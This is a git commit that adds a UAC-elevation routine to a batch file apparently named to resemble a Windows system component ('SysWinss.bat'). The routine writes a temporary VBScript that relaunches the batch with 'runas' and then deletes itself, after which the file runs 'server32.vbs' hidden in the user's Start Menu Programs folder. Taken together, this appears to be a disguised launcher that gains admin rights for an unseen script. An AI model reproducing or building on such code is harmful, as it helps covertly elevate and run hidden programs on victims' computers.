44db57876c23b90e67a31fc09038e3467c8b4005
ryn2020 <148797401+ryn2020@users.noreply.github.com>
2023-11-17 18:02:33 +0100

    Update SysWinss.bat

--- SysWinss.bat
+++ SysWinss.bat
@@ -1,2 +1,7 @@
+echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
+set params = %*:"=""
+echo UAC.ShellExecute "cmd.exe", "/c %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs" 
+"%temp%\getadmin.vbs" 
+del "%temp%\getadmin.vbs"
 cd "%appdata%\Microsoft\Windows\Start Menu\Programs\"
 wscript server32.vbs
